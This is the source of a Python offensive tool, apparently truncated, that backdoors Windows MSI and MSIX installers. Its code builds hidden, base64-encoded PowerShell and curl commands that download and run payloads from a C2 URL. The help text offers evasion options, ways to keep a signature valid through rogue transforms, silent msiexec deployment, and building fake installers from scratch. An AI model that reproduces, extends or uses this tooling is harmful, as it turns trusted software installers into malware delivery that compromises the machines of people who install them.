#!/usr/bin/env python3

import sys
import os
import re
import glob
import html
import base64
import uuid
import shutil
import subprocess
import tempfile
import random
import string
import zipfile

BANNER = """
		██████╗ ███████╗███╗   ███╗██╗
		██╔══██╗██╔════╝████╗ ████║██║
		██║  ██║█████╗  ██╔████╔██║██║
		██║  ██║██╔══╝  ██║╚██╔╝██║██║
		██████╔╝██║     ██║ ╚═╝ ██║██║
		╚═════╝ ╚═╝     ╚═╝     ╚═╝╚═╝

	 Suite for manipulating/creating ".msi" files

	      BiloIndustries - April 2026, v1.0
"""

HELP_MAIN = """

################################################################

Usage:
  python3 dfmi.py <command> [options]

Commands:
  inject      Backdoor an existing MSI package	[Cross-Platform: Windows/Linux]
              Linux Requirements: msibuild/msiinfo
              Windows Requirements: Uses PowerShell COM (no extra tools needed)

  rogue-mst   Generate a .mst transform for a signed MSI  [Please use this module from CMD/PS only.]
              Original MSI Authenticode signature stays valid.

  stub        Create a standalone backdoor MSI from scratch (cross-platform)
              Linux Requirements: wixl/msibuild
              Windows Requirements: Uses embedded base MSI + PowerShell COM
              No original MSI needed. Fully customizable metadata.

  msix        MSIX package operations (Windows only — requires Windows SDK)
              stub    Build a self-signed MSIX that runs an arbitrary EXE on install
              inject  Backdoor an existing MSIX with a StartupTask persistence entry
              inspect Show MSIX contents and manifest summary (cross-platform)

Options:
  -h, --help    Show this help

Evasion Options (available on all commands):
  --action-name NAME    CustomAction name in MSI tables  (default: random)
  --property-name NAME  Property name for exe path       (default: random)
  --sequence NUM        InstallExecuteSequence position  (default: 1510)
  --drop-name NAME      Filename for EXE drop (cmd mode) (default: random)

Examples:
  python3 dfmi.py inject example.msi output.msi --c2 http://<C2>/<PAYLOAD>.ps1
  python3 dfmi.py inject example.msi output.msi --c2 http://<C2>/<PAYLOAD>.exe --mode cmd
  python3 dfmi.py inject example.msi output.msi --c2 http://<C2>/p.ps1 --action-name SvcUpd --sequence 3200
  python3 dfmi.py inject --inspect example.msi

  python3 dfmi.py rogue-mst build example.msi payload.mst --c2 http://<C2>/<PAYLOAD>.ps1
  python3 dfmi.py rogue-mst verify example.msi payload.mst
  python3 dfmi.py rogue-mst deploy example.msi payload.mst [--no-log]

  python3 dfmi.py stub --c2 http://<C2>/payload.ps1
  python3 dfmi.py stub --c2 http://<C2>/payload.ps1 --name "XXX Updater" --manufacturer "XXX Inc."
  python3 dfmi.py stub --c2 http://<C2>/loader.exe --mode cmd -o update.msi

  python3 dfmi.py msix stub --c2 http://<C2>/payload.ps1 -o setup.msix
  python3 dfmi.py msix inject base.msix patched.msix --c2 http://<C2>/payload.ps1
  python3 dfmi.py msix inspect setup.msix

Run 'python3 dfmi.py <command> --help' for command-specific help.
"""

# Embedded base MSI (minimal stub, no files, cross-platform)

BASE_MSI_B64 = "0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAADAAAAAAAAAAAEAAACwAAAAEAAAD+////AAAAABEAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9BZG1pblVJU2VxdWVuY2VBY3Rpb25Db25kaXRpb25TZXF1ZW5jZUNvc3RJbml0aWFsaXplRmlsZUNvc3RDb3N0RmluYWxpemVFeGVjdXRlQWN0aW9uTWVkaWFEaXNrSWRMYXN0U2VxdWVuY2VEaXNrUHJvbXB0Q2FiaW5ldFZvbHVtZUxhYmVsU291cmNlI2NhYjEuY2FiRXJyb3JNZXNzYWdlU2VydmljZUluc3RhbGxOYW1lRGlzcGxheU5hbWVTZXJ2aWNlVHlwZVN0YXJ0VHlwZUVycm9yQ29udHJvbExvYWRPcmRlckdyb3VwRGVwZW5kZW5jaWVzU3RhcnROYW1lUGFzc3dvcmRBcmd1bWVudHNDb21wb25lbnRfRGVzY3JpcHRpb25BcHBTZWFyY2hQcm9wZXJ0eVNpZ25hdHVyZV9VcGdyYWRlVXBncmFkZUNvZGVWZXJzaW9uTWluVmVyc2lvbk1heExhbmd1YWdlQXR0cmlidXRlc1JlbW92ZUFjdGlvblByb3BlcnR5U2hvcnRjdXREaXJlY3RvcnlfVGFyZ2V0SG90a2V5SWNvbl9JY29uSW5kZXhTaG93Q21kV2tEaXJEaXNwbGF5UmVzb3VyY2VETExEaXNwbGF5UmVzb3VyY2VJZERlc2NyaXB0aW9uUmVzb3VyY2VETExEZXNjcmlwdGlvblJlc291cmNlSWRJbnN0YWxsRXhlY3V0ZVNlcXVlbmNlVmFsaWRhdGVQcm9kdWN0SURJbnN0YWxsVmFsaWRhdGVJbnN0YWxsSW5pdGlhbGl6ZVByb2Nlc3NDb21wb25lbnRzVW5wdWJsaXNoRmVhdHVyZXNSZW1vdmVGb2xkZXJzQ3JlYXRlRm9sZGVyc1JlZ2lzdGVyVXNlclJlZ2lzdGVyUHJvZHVjdFB1Ymxpc2hGZWF0dXJlc1B1Ymxpc2hQcm9kdWN0SW5zdGFsbEZpbmFsaXplUmVnaXN0cnlSb290S2V5VmFsdWVBZHZ0RXhlY3V0ZVNlcXVlbmNlQWN0aW9uVGV4dFRlbXBsYXRlRmVhdHVyZUNvbXBvbmVudHNGZWF0dXJlX1Byb2R1Y3RGZWF0dXJlRW1wdHlDb21wRmlsZUZpbGVOYW1lRmlsZVNpemVWZXJzaW9uRGlyZWN0b3J5RGlyZWN0b3J5X1BhcmVudERlZmF1bHREaXJUZW1wRm9sZGVyVEFSR0VURElSLlNvdXJjZURpckluaUZpbGVEaXJQcm9wZXJ0eVNlY3Rpb25SZW1vdmVGaWxlRmlsZUtleUluc3RhbGxNb2RlUmVtb3ZlSW5pRmlsZUFMTFVTRVJTMU1hbnVmYWN0dXJlckJhc2VQcm9kdWN0TGFuZ3VhZ2UxMDMzUHJvZHVjdENvZGV7MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwfVByb2R1Y3ROYW1lQmFzZU1TSVByb2R1Y3RWZXJzaW9uMS4wLjAuMHswMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDF9TGF1bmNoQ29uZGl0aW9uU2lnbmF0dXJlTWluVmVyc2lvbk1heFZlcnNpb25NaW5TaXplTWF4U2l6ZU1pbkRhdGVNYXhEYXRlTGFuZ3VhZ2VzSW5zdGFsbFVJU2VxdWVuY2VDb21wb25lbnRDb21wb25lbnRJZEtl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KwArACsAKwArACsAKwArACsANwA3ADcARABEAEQARABEAEQASABIAEgASQBJAEkASwBLAFEAUQBRAFEAUQBRAFEAUQBVAFUAVQBcAFwAXABcAFwAXABcAFwAXwBfAF8AXwBfAGIAYgBiAGIAYgBiAGIAYgBwAHAAcQBxAHEAcQBxAHEAcQBxAHEAeQB5AHkAegB6AHoAegB6AHoAfgB+AH4AfgB+AH4AgQCBAIEAgQCBAIEAgQCBAIcAhwCJAIkAiQCJAIkAjACMAIwAjACMAI0AjQCNAI0AjQCNAJQAlACVAJUAlQCYAJgAAYACgAOAAYACgAOABIAFgAaAAYACgAGAAoADgASABYAGgAeACIAJgAqAC4AMgA2AAYACgAGAAoABgAKAA4AEgAWABoAHgAGAAoADgASABYAGgAeACIAJgAqAC4AMgA2ADoAPgBCAAYACgAOAAYACgAOABIAFgAaAAYACgAOAAYACgAOAAYACgAGAAoADgASABYAGgAeACIABgAKAA4ABgAKAA4AEgAWABoAHgAiAAYACgAOABIAFgAGAAoADgASABYAGgAeACIABgAKAAYACgAOABIAFgAaAB4AIgAmAAYACgAOAAYACgAOABIAFgAaAAYACgAOABIAFgAaAAYACgAOABIAFgAaAB4AIgAGAAoABgAKAA4AEgAWAAYACgAOABIAFgAGAAoADgASABYAGgAGAAoABgAKAA4ABgAKAAgADAAQACgALAAwADQAOAA8AEQASABMAFAAVABYAFwAYABkAGgAbABwAHQAeAB8AIQAiACEARwAkACUAJgAnACgAKQAqACsALAAUAB4ALQAdAB8ALgAvADAAMQAyADMANAA1ADYAAgADAAQARABFAEYAFABHAB4AAgADAAQAAgAfAEoATAAeAFEAHgBSAFMAVAAnACgABABVAFYAVwBcAFIAXQBeAEYARwACAB4AYAAeAFIAXQBhAGIAUgBdAF4ARgBHAAIAHgADAB8AcQBSAHIAcwB0AHUAdgB3AHgAAgADAAQAegB7ACwAKAADAHwAfgAUAH8AHQCAAB4AgQCCAIMAHwCEAIUALAAoABQAiAACAIoADwAtAIsAIgBFAEYAFACKAI4AjwCQAJEAkgCTABQAiAACAAMABAAsAB4ASK3/nQKVAqUEgUCf/50gnUidAqUAn0it/43/nwSBBIEEgf+d/53/nf+d/51Ijf+fSK1IrUitAI8mrRS9FL3/vQSh/51IjUitSI2Aj0iNSI3/nf+fApVInQKVApVInf+dApX/nQKVSK3/nQKVSK0Chf+P/58An0iNSK3/nQKVSK3/n/+fJq1IrUitSI3/jwSBSJ0UnQKVBIFIrUid/49Irf+PSJ3/j/+P/48ChUiNSK1Ijf+fSI0ChUit/49Inf+P/4//nwKFSI3/rf+PSK3/jRSdFJ0EkQSRBJEEkf+dSK3/nQKVSK0mnUiNAoX/nUidSK3/jwKF/58ClUiNJq0mnUCf/58ClQKFSJ0ChUitAIlIrQKFSJ3/nQSRSK0Chf+N/50ClUitAoUEgQSBBIEEgUitAIlIrf+dApVIrUitAAAAAAAAAAABAAkAEQATACAAIQAjACsANwBEAEgASQBLAFEAVQBcAF8AYgBwAHEAeQB6AH4AgQCHAIkAjACNAJQAlQCYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAAgAAAAJAAAACgAAAAsAAAAMAAAADQAAAA4AAAAPAAAAEAAAABEAAAASAAAAEwAAABQAAAAVAAAAFgAAABcAAAAYAAAA/v///xoAAAAbAAAAHAAAAB0AAAAeAAAAHwAAACAAAAAhAAAAIgAAACMAAAAkAAAAJQAAACYAAAD+////KAAAACkAAAAqAAAAKwAAACwAAAAtAAAALgAAAP7////+/////v////7////+/////v////7////+/////v////7////+////OgAAAP7////+/////v///z4AAAA/AAAAQAAAAEEAAABCAAAAQwAAAEQAAABFAAAARgAAAEcAAABIAAAASQAAAEoAAABLAAAATAAAAE0AAABOAAAATwAAAFAAAAD+/////v////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9SAG8AbwB0ACAARQBuAHQAcgB5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgAFAf//////////BAAAAIQQDAAAAAAAwAAAAAAAAEYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAFAAAAAAAAEBIPz93RWxEajvkRSRIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAIB/////wIAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIGAAAAAAAAQEg/P3dFbERqPrJEL0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAgH/////BQAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZAAAARAMAAAAAAAAFAFMAdQBtAG0AYQByAHkASQBuAGYAbwByAG0AYQB0AGkAbwBuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAACAf///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACcAAADsAQAAAAAAACZBZTi+QWRBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAf////8HAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEAAAA+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAAgAAAAJAAAACgAAAP7////+////DQAAAA4AAAAPAAAAEAAAAP7////9//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8="


# Utils

def is_windows():
    return sys.platform == 'win32'

def gen_guid():
    return "{" + str(uuid.uuid4()).upper() + "}"

def gen_name(n=6):
    """Generate a random alphanumeric identifier, letter-first (MSI CHAR(72) safe)."""
    first = random.choice(string.ascii_uppercase)
    rest  = ''.join(random.choices(string.ascii_uppercase + string.digits, k=n - 1))
    return first + rest

def gen_drop_name():
    """Generate a random EXE filename for cmd-mode payload drop."""
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))) + '.exe'

def _validate_msi_identifier(value, field, max_len=None):
    if not isinstance(value, str) or not value:
        raise ValueError(f"{field} must be a non-empty string")
    if any(ch in value for ch in ("'", "\r", "\n", "\x00")):
        raise ValueError(f"{field} contains unsafe characters")
    if max_len is not None and len(value) > max_len:
        raise ValueError(f"{field} exceeds MSI limit ({max_len})")
    return value

def check_deps_linux(tools):
    """Verify required Linux tools are present before attempting operations."""
    missing = [t for t in tools if shutil.which(t) is None]
    if missing:
        print(f"[!] Missing required tools: {', '.join(missing)}")
        print(f"    Install: sudo apt install msitools wixl")
        return False
    return True

def validate_msi_identifier(value, field_name, max_len=72):
    """Validate MSI identifier names: letter-start, alphanumeric+underscore, max CHAR(72)."""
    if len(value) > max_len:
        print(f"[!] {field_name} '{value[:20]}...' exceeds MSI CHAR({max_len}) limit ({len(value)} chars)")
        sys.exit(1)
    if not re.match(r'^[A-Za-z][A-Za-z0-9_]*$', value):
        print(f"[!] {field_name} must start with a letter and contain only [A-Za-z0-9_]")
        sys.exit(1)

def build_ca_ps(url, drop_name=None):
    if drop_name is None:
        drop_name = gen_drop_name()
    if url.endswith('.ps1'):
        ps = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
    else:
        ps = (f"$p=$env:TEMP+'\\{drop_name}';"
              f"(New-Object Net.WebClient).DownloadFile('{url}',$p);"
              f"Start-Process $p -WindowStyle Hidden")
    b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
    return f'/c "powershell -NoP -W Hidden -NonI -Exec Bypass -Enc {b64} & exit 0"'

def build_ca_cmd(url, drop_name=None):
    if drop_name is None:
        drop_name = gen_drop_name()
    return f'/c "curl -s {url} -o %TEMP%\\{drop_name} && start /b %TEMP%\\{drop_name} & exit 0"'

def run_ps(script):
    tmp = tempfile.NamedTemporaryFile(suffix=".ps1", mode='w',
                                      encoding='utf-8', delete=False)
    tmp.write(script)
    tmp.close()
    try:
        r = subprocess.run(
            ['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmp.name],
            capture_output=True, text=True, timeout=120
        )
        return r.returncode == 0, r.stdout.strip(), r.stderr.strip()
    finally:
        try:
            os.unlink(tmp.name)
        except Exception:
            pass

# Inject Module

HELP_INJECT = """
Command: inject
===============
Backdoor an existing MSI by injecting a CustomAction.
Works on Kali (msibuild) and Windows (PowerShell COM).
Original MSI is never modified — a copy is produced.

Usage:
  python3 dfmi.py inject <target.msi> <output.msi> --c2 <url> [options]
  python3 dfmi.py inject --inspect <target.msi>

Arguments:
  target.msi          Source MSI (untouched)
  output.msi          Backdoored output MSI
  --c2 <url>          Payload URL on C2 server
  --mode ps           PowerShell IEX fileless (default)
  --mode cmd          curl download + execute EXE
  --inspect           Dump MSI tables instead of backdooring

Evasion Options:
  --action-name NAME  CustomAction name   (default: random)
  --property-name N   Property name       (default: random)
  --sequence NUM      Sequence position   (default: 1510)
  --drop-name NAME    EXE drop filename   (default: random, cmd mode only)

Notes:
  - ProductCode and PackageCode randomized on every run (cache bypass)
  - UpgradeCode randomized independently (avoids upgrade-chain collision)
  - Missing tables auto-created (handles MSIs like 7-Zip)
  - CA returns exit 0 — install never aborts
  - Authenticode signature invalidated on signed MSIs (use rogue-mst to preserve)

Deploy:
  msiexec /i output.msi /qn
  msiexec /i output.msi /qn && msiexec /x {ProductCode} /qn
"""

# Linux back-end

def _sql_linux(msi, query):
    r = subprocess.run(['msibuild', msi, '-q', query], capture_output=True, text=True)
    return r.returncode == 0, r.stderr.strip()

def _export_linux(msi, table):
    r = subprocess.run(['msiinfo', 'export', msi, table], capture_output=True, text=True)
    return r.stdout if r.returncode == 0 else r.stderr

def _ensure_table_linux(msi, table, header, col_types):
    out = _export_linux(msi, table)
    if "table not found" in out or not out.strip():
        print(f"[*] Creating {table} table...")
        idt = tempfile.NamedTemporaryFile(suffix=".idt", mode="w", delete=False)
        idt.write(header + "\r\n")
        idt.write(col_types + "\r\n")
        idt.write(table + "\tAction\r\n")
        idt.close()
        r = subprocess.run(["msibuild", msi, "-i", idt.name], capture_output=True, text=True)
